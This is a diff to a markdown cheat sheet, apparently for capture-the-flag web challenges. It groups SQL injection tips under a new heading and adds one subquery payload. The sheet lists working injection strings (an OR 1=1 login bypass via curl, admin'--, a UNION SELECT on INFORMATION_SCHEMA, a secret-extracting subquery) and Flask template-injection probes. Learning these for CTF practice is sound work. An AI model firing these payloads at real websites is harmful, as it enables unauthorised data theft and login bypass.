@@ -29,13 +29,15 @@ we can see all files running in the process with given process id.
 * john the ripper :- tool for password cracking
 
 ## <a name = "web">Web</a>
+### SQL injections
 * curl "url" --data "username=admin&password='+or+1=1--" && echo 
 this command will find the information to username admin stored in database (SQL injection).
 * try admin'-- for SQLi.
-* Robots -->>> url/robots.txt (shows hidden info)
-* Basic Injection  if there is a hidden info in the data base then to leak the data type 'OR''=' in the info bar.
+* '||( SELECT secret FROM user WHERE username = 'a' )||'
 * 1 union select 1,TABLE_NAME, 3,4 from INFORMATION_SCHEMA.TABLES     input this code in the info bar of a website for sql attack using injection.
+* Basic Injection  if there is a hidden info in the data base then to leak the data type 'OR''=' in the info bar.
 *  Postman great tool for web challs
+* Robots -->>> url/robots.txt (shows hidden info)
 * If a website uses flask, then try using {{ 7*7 }}to see its working, then use {{ config }} in the text fields.
 * To post requests to php from terminal use curl -X POST "url"
 
